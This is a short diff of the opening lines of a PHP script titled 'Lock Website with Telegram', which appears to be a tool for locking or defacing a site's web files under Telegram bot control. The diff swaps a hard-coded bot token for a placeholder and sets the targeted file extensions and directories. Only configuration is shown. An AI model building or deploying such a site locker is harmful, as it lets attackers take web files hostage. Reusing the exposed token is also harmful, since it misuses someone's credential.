@@ -1,11 +1,11 @@
 <?php
 // ============================================
-// LOCK WEBSITE with TELEGRAM + CYBER THEME
+// LOCK WEBSITE with TELEGRAM 
 // Coded By : Dkid03 
 // ============================================
 
 // ------------------- KONFIGURASI -------------------
-$bot_token = '8040266222:AAH6t_vQFl_JTYR6rJzi7yakUMd3xWDqS7k';
+$bot_token = 'GANTI TOKEN BOT KAMU';
 $extensions = ['php', 'html', 'htm', 'phtml'];
 $directories = [__DIR__];
 $excluded_files = [
